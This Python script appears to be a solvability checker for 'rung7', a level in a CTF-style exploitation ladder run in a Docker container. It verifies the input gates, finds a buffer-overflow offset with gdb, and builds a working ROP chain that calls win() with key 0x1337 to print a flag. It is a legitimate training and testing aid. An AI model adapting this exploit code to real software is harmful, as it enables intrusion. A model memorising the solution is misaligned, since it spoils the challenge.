#!/usr/bin/env python3
"""Known-good exploit for rung7 (chained ROP with bad-byte gate) — proof of
solvability.

Drives a live enigma-homework container from the HOST via docker exec.
Gates: "PWN7" magic + a payload scan rejecting {0x20 0x09 0x0a 0x0d 0x2c 0x40}.
win() only prints with rdi==0x1337 ("win: wrong key" otherwise), so the chain is
  padding -> rop_pop_rdi -> 0x1337 -> win
all addresses verified bad-byte-clean at build time (text base 0x20000).
Offset from gdb on a header-prefixed cyclic pattern (expect 112 from file
start — 8-byte header + 104 to the ret slot; vuln's memcpy locals make it
NOT the 88 you'd compute from buf[80] alone).

Usage: python3 solve_rung7.py <container_id_or_name>
Exit code 0 on PASS, 1 on FAIL.
"""
import json
import os
import re
import struct
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))

HEADER = b"PWN7\x00\x00\x00\x00"
KEY = 0x1337
BAD = set(b"\x20\x09\x0a\x0d\x2c\x40")


def docker_exec(cid, cmd, input_bytes=None, timeout=120):
    return subprocess.run(["docker", "exec", "-i", cid] + cmd,
                          input=input_bytes, capture_output=True,
                          timeout=timeout)


def cyclic(n, subseq=4):
    k = 26
    alphabet = [chr(ord('a') + i) for i in range(k)]
    a = [0] * (k * subseq)
    seq = []

    def db(t, p):
        if t > subseq:
            if subseq % p == 0:
                seq.extend(a[1:p + 1])
        else:
            a[t] = a[t - p]
            db(t + 1, p)
            for j in range(a[t - p] + 1, k):
                a[t] = j
                db(t + 1, t)

    db(1, 1)
    return "".join(alphabet[i] for i in seq).encode()[:n]


def discover_offset(cid, binary, fallback=112):
    """Offset from FILE start to the saved retaddr (pattern carries the header)."""
    pat = HEADER + cyclic(256)
    docker_exec(cid, ["bash", "-c", "cat > /tmp/pat.bin"], input_bytes=pat)
    r = docker_exec(cid, ["gdb", "-q", "-batch",
                          "-ex", "run /tmp/pat.bin",
                          "-ex", "info registers rip",
                          "-ex", "x/1gx $rsp",
                          binary])
    body = pat[len(HEADER):]
    for rx in (rb"rip\s+(0x[0-9a-f]+)", rb"0x[0-9a-f]+:\s+(0x[0-9a-f]+)"):
        m = re.search(rx, r.stdout)
        if m:
            val = int(m.group(1), 16)
            off = body.find(struct.pack("<Q", val)[:4])
            if off >= 0:
                print("[*] crash value 0x%x -> offset %d (from file start)"
                      % (val, off + len(HEADER)))
                return off + len(HEADER)
    print("[!] gdb offset inconclusive, fallback %d" % fallback)
    return fallback


def clean(addr):
    return not any(b in BAD for b in addr.to_bytes(8, "little"))


def solve(cid):
    expected = json.load(open(os.path.join(HERE, "flags.json")))["rung7"]

    # 0. Gates.
    r = docker_exec(cid, ["bash", "-c", "printf 'AAAAAAAA' > /tmp/bad.bin && /target/rung7 /tmp/bad.bin"])
    if b"bad magic" not in r.stdout:
        print("FAIL: magic gate did not reject:\n" + r.stdout.decode(errors="replace"))
        return False
    r = docker_exec(cid, ["bash", "-c",
                          "python3 -c \"open('/tmp/bad2.bin','wb').write(b'PWN7\\x00\\x00\\x00\\x00' + b'A'*16 + b' ')\" "
                          "&& /target/rung7 /tmp/bad2.bin"])
    if b"bad char" not in r.stdout:
        print("FAIL: bad-byte gate did not reject:\n" + r.stdout.decode(errors="replace"))
        return False
    print("[*] gates verified: no-magic -> 'bad magic', 0x20 -> 'bad char'")

    # 1. Symbols: win + the labeled gadget; both must be bad-byte-clean.
    r = docker_exec(cid, ["nm", "/target/rung7"])
    addrs = {}
    for sym in ("win", "rop_pop_rdi"):
        m = re.search(rb"^([0-9a-f]+) [Tt] %s$" % sym.encode(), r.stdout, re.M)
        if not m:
            print("FAIL: %s not found in nm output" % sym)
            return False
        addrs[sym] = int(m.group(1), 16)
        if not clean(addrs[sym]):
            print("FAIL: %s @ 0x%x has a bad byte" % (sym, addrs[sym]))
            return False
    print("[*] win @ 0x%x, rop_pop_rdi @ 0x%x (both clean)"
          % (addrs["win"], addrs["rop_pop_rdi"]))

    # 2. Single-address ret2win must FAIL with "wrong key" (proves the chain
    # is required, not just helpful).
    offset = discover_offset(cid, "/target/rung7")
    pad = offset - len(HEADER)
    naive = HEADER + b"A" * pad + struct.pack("<Q", addrs["win"])
    docker_exec(cid, ["bash", "-c", "cat > /tmp/naive.bin"], input_bytes=naive)
    r = docker_exec(cid, ["/target/rung7", "/tmp/naive.bin"])
    if b"wrong key" not in r.stdout:
        print("FAIL: naive ret2win should print 'win: wrong key', got:\n"
              + r.stdout.decode(errors="replace"))
        return False
    print("[*] naive ret2win correctly rejected: 'win: wrong key'")

    # 3. The chain.
    payload = (HEADER + b"A" * pad
               + struct.pack("<Q", addrs["rop_pop_rdi"])
               + struct.pack("<Q", KEY)
               + struct.pack("<Q", addrs["win"]))
    docker_exec(cid, ["bash", "-c", "cat > /tmp/chain.bin"], input_bytes=payload)
    r = docker_exec(cid, ["/target/rung7", "/tmp/chain.bin"])
    out = r.stdout
    print("[*] target output:\n" + out.decode(errors="replace").strip())

    got = re.search(rb"flag\{[^}]*\}", out)
    if got and got.group(0).decode() == expected:
        print("PASS: rung7 solved, flag matches flags.json: %s" % expected)
        return True
    print("FAIL: expected %s, got %s"
          % (expected, got.group(0).decode() if got else None))
    return False


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(__doc__)
        sys.exit(2)
    sys.exit(0 if solve(sys.argv[1]) else 1)
